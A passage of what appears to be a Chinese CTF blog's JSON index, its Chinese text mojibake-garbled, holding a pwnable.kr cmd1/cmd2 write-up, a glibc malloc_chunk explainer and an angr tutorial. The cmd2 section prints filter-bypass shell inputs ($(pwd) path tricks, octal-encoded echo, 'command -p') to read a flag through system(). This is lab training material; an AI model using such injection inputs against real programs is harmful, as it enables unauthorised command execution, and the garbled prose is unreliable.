·ï¼Œä¸‹é¢è´´æµ‹è¯•ä»£ç  1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char**argv)&#123; //æ‰“å°æ”¹å˜å‰çš„PATHï¼Œå¹¶ä¸”ä½¿ç”¨å‘½ä»¤ printf(&quot;before PATH: %s\\n&quot;,getenv(&quot;PATH&quot;)); system(argv[1]); //æ”¹å˜PATHï¼Œå°†å…¶è®¾ç½®æˆä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ putenv(&quot;PATH=/aaa&quot;); //å†æ¬¡æ‰“å°è·¯å¾„ printf(&quot;after PATH: %s\\n&quot;, getenv(&quot;PATH&quot;)); system(argv[1]); return 0;&#125; ç¼–è¯‘åè¿è¡Œï¼Œè¿™é‡Œæˆ‘ä»¬æµ‹è¯•çš„å‘½ä»¤æ˜¯ ls ï¼Œå¯ä»¥å‘ç°lså‘½ä»¤å·²ç»å¤±æ•ˆäº†ï¼Œç”±äºPATHçš„è·¯å¾„è¢«ä¸´æ—¶æ”¹å˜ï¼Œéœ€è¦ä½¿ç”¨lså‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/ls å†æ¬¡æµ‹è¯•ï¼Œä½¿ç”¨å‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/lsï¼Œå¯ä»¥å‘ç°åˆå¯ä»¥æ­£å¸¸è¿è¡Œäº† æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬éœ€è¦è¾“å…¥catå‘½ä»¤çš„ç»å¯¹è·¯å¾„ /bin/catï¼Œä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œflagè¿™ä¸ªè¯è¢«è¿‡æ»¤æ‰äº†ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨åˆ°ç»Ÿé…ç¬¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€œ/bin/cat f*â€œ æˆ–è€… â€œ/bin/cat fla?â€ ç­‰å‘½ä»¤æ¥å®ç°æŸ¥çœ‹flag 12./cmd1 &#x27;/bin/cat fla?&#x27;./cmd1 &#x27;/bin/cat f*&#x27; mommy now I get what PATH environment is for :) method 2ç¬¬äºŒç§æ–¹æ³•æ˜¯æˆ‘ä»¬é‡‡ç”¨shellç¼–ç¨‹æ–¹å¼ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨åˆ©ç”¨ç¨‹åºæ‰“å¼€æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„å­—ç¬¦è€Œä¸å—é™åˆ¶ é¦–å…ˆç°åœ¨æœåŠ¡å™¨çš„/tmp/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±ä½¿ç”¨çš„ç›®å½•ï¼Œç„¶ååœ¨ç›®å½•ä¸­åˆ›å»ºæˆ‘ä»¬çš„æ–‡ä»¶ï¼Œä¸€ä¼šå„¿éœ€è¦ç”¨ç¨‹åºæ¥è°ƒç”¨ åœ¨åˆ›å»ºbashæ–‡ä»¶ï¼Œæ–‡ä»¶åå­—é‡Œé¢åƒä¸‡ä¸èƒ½å¸¦æœ‰è¿‡æ»¤å­—ç¬¦ï¼ˆæˆ‘è¸©äº†è¿™ä¸ªå‘ğŸ˜¥ï¼‰ï¼Œç„¶åå†™å…¥å‘½ä»¤ è®©ç¨‹åºè°ƒç”¨æ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°æ•ˆæœ cmd2 cmd2çš„è€ƒç‚¹ä¸cmd1å¤§åŒå°å¼‚ï¼Œåªæ˜¯è¿™ä¸€æ¬¡æºç ä¸­è¿‡æ»¤äº†æ›´å¤šçš„å­—ç¬¦ï¼Œéœ€è¦æ›´é«˜çš„æŠ€å·§æ‰èƒ½ç»•è¿‡å­—ç¬¦è¿‡æ»¤æ£€æµ‹æ‹¿åˆ°flagï¼Œä¸‹é¢è´´æºç  12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; å¯ä»¥çœ‹åˆ°è¿™æ¬¡ç¨‹åºç›´æ¥è¿‡æ»¤äº†â€™/â€˜,â€™.â€™ä¹‹ç±»çš„ç¬¦å·ï¼Œè¿è·¯å¾„éƒ½ä¸è®©ä½¿ç”¨ğŸ’” ä¸‹é¢æˆ‘æä¾›å‡ ç§ç§æ–¹æ³•ï¼ˆç½‘ä¸Šçœ‹åˆ°æ€»ç»“çš„ï¼Œå­¦ä¹ ä¸€æ‰‹ï¼‰ åˆ©ç”¨pwdåˆ©ç”¨$ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥åˆ°æ ¹ç›®å½•ï¼Œç”¨$(pwd)æ¥ä»£æ›¿â€™/â€˜ 123cd //home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;/home/cmd2/cmd2 &quot;\\$(pwd)bin\\$(pwd)cat \\$(pwd)home\\$(pwd)cmd2\\$(pwd)f*&quot; ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼Œè¿™æ˜¯linuxä¸­åŒå¼•å·å’Œå•å¼•å·çš„åŒºåˆ«ï¼Œä¸‹é¢è¿™ç¯‡æ–‡ç« å¯ä»¥äº†è§£ä»–ä»¬ä¹‹é—´çš„åŒºåˆ« Linuxä¸­å•å¼•å·åŒå¼•å·çš„åŒºåˆ«ä¸ç”¨æ³• command -p12&#x27;command -p&#x27; //è¿™æ¡å‘½ä»¤ä¼šå¼ºåˆ¶å°†ç¯å¢ƒå˜ä¸ºé»˜è®¤å€¼ï¼Œå°±ä¸ç”¨ä½¿ç”¨ç»å¯¹è·¯å¾„./cmd2 &#x27;command -p cat f*&#x27; echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶åœ¨ç½‘ä¸Šçœ‹åˆ«äººwpå­¦çš„å…¶å®æˆ‘è§‰å¾—åŸç†å’Œç¬¬ä¸€ä¸ªå·®ä¸å¤ªå¤šï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨echoå¯ä»¥è§£æ16è¿›åˆ¶å’Œ8è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆä½†æ˜¯ä¸èƒ½ç”¨å‚æ•° -eï¼‰ï¼Œå…·ä½“æƒ…å†µè¦çœ‹ç³»ç»Ÿç‰ˆæœ¬ã€‚ï¼ˆæˆ‘åœ¨ç½‘ä¸Šçœ‹åˆ°ä»–ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šechoå‘½ä»¤å¯ä»¥è§£é‡Š8è¿›åˆ¶ï¼Œä½†æˆ‘è¯•äº†è¯•å°±ä¸è¡Œï¼Œè¿˜æ˜¯è®°å½•ä¸‹è¿™ä¸ªæ–¹æ³•ï¼‰ 12345# å°† /bin/cat flag è½¬åŒ–ä¸º8è¿›åˆ¶from pwn import *cmd = &quot;/bin/cat flag&quot;print(&quot;\\\\&quot;+&quot;\\\\&quot;.join([oct(i) for i in ordlist(cmd)]))# \\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147 1./cmd2 &#x27;$(echo &quot;\\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147&quot;)&#x27; æˆ‘çš„æœ¬åœ°è™šæ‹Ÿæœºå°±ä¸å¯ä»¥ç›´æ¥ç”¨echoå‘½ä»¤è½¬ï¼Œéœ€è¦å‚æ•°-e set -så…·ä½“çš„åŸç†è¿˜æ²¡æœ‰åœ¨ç½‘ä¸Šæ‰¾åˆ°ï¼Œç­‰åé¢è¡¥å…… Bash è„šæœ¬ set å‘½ä»¤æ•™ç¨‹ 12./cmd2 &#x27;set -s&#x27;&gt;/bin/cat flag æ€»ç»“ shellç¼–ç¨‹ç‚¹éƒ½ä¸ä¼šï¼Œå…¶å®ä¸Šå­¦æœŸå­¦äº†çš„ï¼Œåªæ˜¯ä¸Šç½‘è¯¾ä¸€ç‚¹éƒ½æ²¡æœ‰è®¤çœŸå¬ã€‚ã€‚æƒ³åœ¨æƒ³èµ·æ¥æœ‰ç‚¹å‚»ï¼Œåé¢éœ€è¦è¡¥ä¹ ä¸‹shellçš„çŸ¥è¯† linuxçš„ä¸œè¥¿å¤ªçµæ´»äº†ã€‚ã€‚å…¶å®ä¸Šé¢çš„ä¸¤é“é¢˜è¿˜æœ‰å‡ ç§å…¶ä»–çš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ç²¾åŠ›å’Œæ—¶é—´æœ‰é™ï¼Œåªæ”¶é›†äº†å‡ ç§æˆ‘æ„Ÿè§‰è¿˜å¯ä»¥çš„æ–¹æ³• æˆ‘å¤ªèœäº†ã€‚ã€‚ğŸ¹","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwn heap[malloc_chunkç»“æ„ä½“]","slug":"CTF/pwn/heap/malloc_chunkç»“æ„","date":"2021-07-14T04:44:16.790Z","updated":"2021-08-08T09:37:14.450Z","comments":true,"path":"19484/","link":"","permalink":"http://example.com/19484/","excerpt":"","text":"æ–‡ç« å‚è€ƒäº†äº†ç½‘ä¸Šçš„ä¸€äº›å¸ˆå‚…æ–‡ç« å†…å®¹ï¼Œæ€»ç»“äº†ä¸€äº›è‡ªå·±çš„ç†è§£ã€‚ malloc_chunkç»“æ„ä½“æˆå‘˜è§£æmalloc_chunkç»“æ„å®šä¹‰ 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a &quot;view&quot; into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; å„ä¸ªæˆå‘˜çš„ä½œç”¨ prev_size å¦‚æœè¯¥chunkç‰©ç†åœ°å€ç›¸é‚»çš„å‰ä¸€chunk(ä¸¤ä¸ªæŒ‡é’ˆçš„å·®å€¼ä¸ºå‰ä¸€ä¸ªchunkå¤§å°)æ˜¯ç©ºé—²çš„chunkï¼Œè¿™ä¸ªå­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ªå­—ç¬¦æ®µçš„å¤§å° ç”¨äºå‚¨å­˜ç‰©ç†åœ°å€ç›¸é‚»çš„chunk(ä½åœ°å€chunk)çš„ä¿¡æ¯ è¢«å…±äº«ï¼Œå¦‚æœå½“å‰chunkå¤§ä¸å¤Ÿç”¨ï¼Œå¯ä»¥å ç”¨ä¸‹ä¸€ä¸ªchunkçš„prev_sizeå­—æ®µ size å­˜å‚¨å½“å‰chunkçš„å¤§å°ï¼Œchunkçš„å¤§å°å†…å­˜ç”³è¯·ï¼Œä¸SIZE_SZæœ‰å…³ï¼Œå¦‚æœä¸æ˜¯2*SIZE_SZçš„æ•´æ•°å€ï¼Œä¼šè‡ªåŠ¨å‘ä¸Šå–æ•´åˆ°2*SIZE_SZçš„æ•´æ•°å€ï¼Œ32ä½æ“ä½œç³»ç»Ÿä¸­SIZE_SZæ˜¯32ä½4ä¸ªå­—èŠ‚ï¼Œ64ä½æ“ä½œç³»ç»Ÿä¸­SIZE_SZæ˜¯64ä½8ä¸ªå­—èŠ‚ã€‚32ä½å¿…é¡»8å­—èŠ‚å¯¹é½ï¼Œ64ä½å¿…é¡»16å­—èŠ‚å¯¹é½ï¼Œæ— è®º32ä½è¿˜æ˜¯64ä½ï¼Œsizeæœ€åä¸‰ä½éƒ½æ²¡æœ‰ç”¨ï¼Œæ‰€ç”¨å¯ä»¥ç”¨æ¥å­˜å‚¨å…¶ä»–ä¿¡æ¯ NON_MAIN_ARENA IS_MAPPED è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapç”³è¯· PREV_INUSE è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚ fdå’Œbk chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œfdåœ°å€æ®µå­˜æ”¾çš„æ˜¯ç”¨æˆ·æ•°æ®ã€‚chunkåœ¨ç©ºé—²çš„æ—¶å€™é€šè¿‡é“¾è¡¨ç®¡ç† fdæŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk bkæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk fd_nextsizeå’Œbk_nextsize - chunkè¢«ä½¿ç”¨æ—¶å†…å­˜ç»“æ„ 1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) .next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ chunkè¢«é‡Šæ”¾æ—¶å†…å­˜ç»“æ„ 1234567891011121314151617chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&#x27; | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&#x27; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ å†…å­˜å¯¹é½mallocå‡½æ•°ç”³è¯·çš„chunkåœ°å€éƒ½æ˜¯8å­—èŠ‚æˆ–è€…16å­—èŠ‚å¯¹é½ï¼ˆ32ä½8å­—èŠ‚ï¼Œ64ä½16å­—èŠ‚ï¼‰ï¼Œæ‰€è°“å­—èŠ‚å¯¹é½ï¼Œå°±æ˜¯æ‰€æœ‰çš„åœ°å€æœ€å8ä½æˆ–16ä½éƒ½æ˜¯ä¸€æ ·çš„ï¼ˆå¤§å¤šæ•°æ—¶å€™ä¸º8çš„æ•´æ•°å€ï¼‰ï¼Œå¸¸è§çš„å†…å­˜å¯¹é½æœ‰8å­—èŠ‚å¯¹é½å’Œ16å­—èŠ‚å¯¹é½ 8å­—èŠ‚å¯¹é½ åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º8 16å­—èŠ‚å¯¹é½ åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º0 ä¸‹é¢ç”¨pwndbgå±•ç¤º32ä½ä¸‹chunkå†…å­˜ç»“æ„ pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„æµ‹è¯•æºç  12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int* ptr1 = (int*)malloc(8); int* ptr2 = (int*)malloc(16); int* ptr3 = (int*)malloc(32); int* ptr4 = (int*)malloc(64); int* ptr5 = (int*)malloc(128); int* ptr6 = (int*)malloc(256); printf(&quot;ptr1-&gt;%p\\n&quot;, ptr1); printf(&quot;ptr2-&gt;%p\\n&quot;, ptr2); printf(&quot;ptr3-&gt;%p\\n&quot;, ptr3); printf(&quot;ptr4-&gt;%p\\n&quot;, ptr4); printf(&quot;ptr5-&gt;%p\\n&quot;, ptr5); printf(&quot;ptr6-&gt;%p\\n&quot;, ptr6); free(ptr1); free(ptr2); free(ptr3); free(ptr4); free(ptr5); free(ptr6); return 0;&#125; 32ä½ç¨‹åº 64ä½ç¨‹åº heapå‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å †ä¿¡æ¯ åˆ†æäºŒè¿›åˆ¶æ•°æ® 64ä½ç¨‹åºchunkç»“æ„ä¸ä¹‹ç±»ä¼¼","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"ctf_angrğŸ¦„[angr_0]","slug":"CTF/angr/ctf_angr_0","date":"2021-07-14T04:44:16.720Z","updated":"2021-08-08T09:38:13.332Z","comments":true,"path":"17540/","link":"","permalink":"http://example.com/17540/","excerpt":"","text":"ctf_angrä¸€ä¸ªç”¨äºç»ƒä¹ angrçš„ctfé¢˜åº“ï¼Œä»å…¥é—¨åˆ°è¿›é˜¶ï¼ŒåŒæ—¶é…å¥—å…¨è‹±æ–‡pptï¼Œä»ç¬¦å·æ‰§è¡Œåˆ°angrè¯¦ç»†ä½¿ç”¨æ–¹å¼ï¼Œä¸€ç«™å¼å…¥é—¨ğŸ‘ GitHubä¸‹è½½åœ°å€[é“¾æ¥] 00_angr_findidaåˆ†æä¼ªä»£ç éå¸¸ç®€å•,æ‰§è¡Œæµç¨‹ä¸ºï¼šè¾“å…¥-&gt;åŠ å¯†-&gt;æ¯”è¾ƒ-&gt;è¾“å‡ºï¼Œåˆ†æ”¯å°‘ï¼Œæ‰€ä»¥éå†èµ·æ¥é€Ÿåº¦å¾ˆå¿« ä¼ªä»£ç æ˜“è¯»ï¼Œæ•°æ®çš„å­—ç¬¦ä¸²ç»è¿‡complex_functionå‡½æ•°åŠ å¯†è¿‡åæ¯”è¾ƒã€‚ å¦‚æœæŒ‰ç…§ä¼ ç»Ÿçš„æ–¹æ³•ï¼Œéœ€è¦é€†åŠ å¯†ç®—æ³•ç„¶åå†™å‡ºè§£å¯†ç®—æ³•ï¼Œä½†æ˜¯angrä¸éœ€è¦è¿™äº›ç¹ççš„æ“ä½œï¼Œåªéœ€è¦å‘Šè¯‰å…¶å®åœ°å€å’Œç›®æ ‡åœ°å€ï¼Œangrå°±ä¼šè¿›è¡Œæ‰€æœ‰éå†ï¼Œå¯¹ç¬¦å·è¿›è¡Œçº¦æŸï¼Œä»è€Œå¾—å‡ºç»“æœã€‚ angréå†æ±‚è§£é¦–å…ˆè´´å‡ºå…¨ä»£ç ä»¥åŠè¿è¡Œç»“æœï¼Œæœ€åæ‰“å°çš„å€¼å°±æ˜¯å¯¹ç¬¦å·ä¸æ–­çº¦æŸæ±‚è§£å¾—åˆ°çš„ç»“æœ 12345678910111213141516import angrimport sysfilepath = &#x27;/home/fish/æ¡Œé¢/00_angr_find&#x27;project = angr.Project(filepath)initial_state = project.factory.entry_state()print_good_addr = 0x0804867Dsimulation = project.factory.simgr(initial_state)simulation.explore(find = print_good_addr)if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()))else: print(&#x27;Could not find the solution&#x27;) ä½¿ç”¨angrè¿‡ç¨‹ åˆ›å»ºé¡¹ç›® é¦–å…ˆç”¨Projectå‡½æ•°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼ŒProjectå‚æ•°ä¸ºéœ€è¦æ±‚è§£çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ 1project = angr.Project(filepath) å‘Šè¯‰angrä»å“ªå„¿å¼€å§‹æ‰§è¡Œ entry_state()è¡¨æ˜ä»mainå‡½æ•°å¼€å§‹æ‰§è¡Œï¼ˆä»å¤´å¼€å§‹æ‰§è¡Œï¼‰ 1initial_state = project.factory.entry_state() åˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨ simgræ˜¯åˆ›å»ºå‡½æ•° 1simulation = project.factory.simgr(initial_state) å¼€å§‹æ¢ç´¢äºŒè¿›åˆ¶æ–‡ä»¶ exploreå‡½æ•°éœ€è¦éå†çš„ç»“æŸåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºä¸­æ‰“å°å­—ç¬¦ä¸²**Good Job.**çš„åœ°å€ã€‚ 12print_good_address = 0x0804867Dsimulation.explore(find=print_good_address) æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ å¦‚æœæ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œfoundä¸ä¸ºç©ºï¼ˆåœ¨pyhonä¸­ç©ºä»£è¡¨falseï¼Œä¸ä¸ºç©ºä»£è¡¨trueï¼‰,å°†è§£å†³æ–¹æ¡ˆæ‰“å°åˆ°å±å¹•è¾“å‡ºç«¯ 12if simulation.found: solution_state = simulation.found[0] æ€»ç»“ä¸»è¦è¿‡ç¨‹åˆ›å»ºå·¥ç¨‹ â€“&gt; æŒ‡å®šæ‰§è¡Œå…¥å£ â€“&gt; åˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¨¡æ‹Ÿå™¨ â€“&gt; æ¢ç´¢å„ä¸ªåˆ†æ”¯ â€“&gt; è§£å‡ºè§£å†³æ–¹æ¡ˆ â€“&gt; æ‰“å°ç»“æœ 01_angr_avoidâ€‹ è¿™ä¸€æ¬¡çš„æ–‡ä»¶è¾ƒå¤§ï¼Œmainå‡½æ•°åœ¨idaä¸­ä¸èƒ½F5ï¼Œå³ä¾¿F5è¿‡åä¹Ÿå¯èƒ½å› ä¸ºä¼ªä»£ç è¾ƒå¤æ‚æ— æ³•é˜…è¯»ï¼Œæ‰€ä»¥åœ¨ç®€å•è§‚å¯Ÿè¿‡åå¯ä»¥ç›´æ¥ç”¨angrçœ‹æ˜¯å¦æœ‰è§£ï¼Œä½†æ˜¯ä½œè€…è¿™æ¬¡åœ¨ç¨‹åºä¸­åŠ äº†ä¸€ç‚¹æ–™ï¼Œæ–¹ä¾¿æˆ‘ä»¬å­¦ä¹ avoidå‚æ•° should_succeedè¿™ä¸ªå˜é‡åˆå§‹å€¼ä¸º1æœ¬èº«å¹¶æ²¡æœ‰é—®é¢˜ä½†æ˜¯avoid_meå‡½æ•°ä¼šå°†should_succeedèµ‹å€¼ä¸º0ã€‚ â€‹ æ‰€ä»¥è¿™ä¸ªå¦‚æœè¦æ‰“å°å‡º**Good Job.**éœ€è¦ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼ˆshould_succeedå€¼ä¸º1ï¼Œä¸”è¾“å…¥çš„å­—ç¬¦ä¸²åŠ å¯†è¿‡åæ»¡è¶³æ¡ä»¶ï¼‰ï¼Œå¦‚æœåœ¨éå†æ—¶ä¸æ·»åŠ avoidæ¡ä»¶ä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´ï¼ˆè™½ç„¶ç»“æœä¸€æ ·ï¼‰ï¼Œä¸ºäº†å°½å¯èƒ½çš„èŠ‚çº¦æ—¶é—´ï¼Œéœ€è¦åœ¨éå†æ—¶é¿å…avoid_meå‡½æ•°ï¼Œæ‰€ä»¥åœ¨ä¸Šä¸€ä¸ªçš„æ¡ä»¶ä¸‹ï¼Œéœ€è¦åœ¨æ·»åŠ å…¶ä»–æ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ·»åŠ avoid 12avoid_addr = 0x080485A8 # avoid_meå‡½æ•°åœ°å€simgr.explore(find = good_addr, avoid = avoid_addr) # æ·»åŠ avoidæ¡ä»¶ 02_angr_condtionå‡ºäº†åœ¨idaä¸­ç›´æ¥å¯»æ‰¾å­—ç¬¦ä¸²åœ°å€ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰å‡½æ•°éå†æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¯»æ‰¾éœ€è¦çš„å­—ç¬¦ä¸²åœ°å€ 12345678910111213# è‡ªå®šä¹‰å‡½æ•°å¯»æ‰¾å­—ç¬¦ä¸²def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdoutdef is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout å®Œæ•´è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637from z3 import *import angrimport sysdef main(): filepath = &#x27;./02_angr_find_condition&#x27; project = angr.Project(filepath) init = project.factory.entry_state() simgr = project.factory.simgr(init) def is_success(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Good Job.&#x27; in stdout_stdout def is_fail(state): #print(state) stdout_stdout = state.posix.dumps(1) print(stdout_stdout) return b&#x27;Try again.&#x27; in stdout_stdout print(is_success) print(is_fail) simgr.explore(find=is_success, avoid=is_fail) if simgr.found: solution = simgr.found[0] flag = solution.posix.dumps(0) print(flag) else: raise Exception(&#x27;not find&#x27;)if __name__ == &quot;__main__&quot;: main()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"},{"name":"ç¬¦å·æ‰§è¡Œ","slug":"ç¬¦å·æ‰§è¡Œ","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"web","slug":"CTF/web","permalink":"http://example.com/categories/CTF/web/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"},{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"ct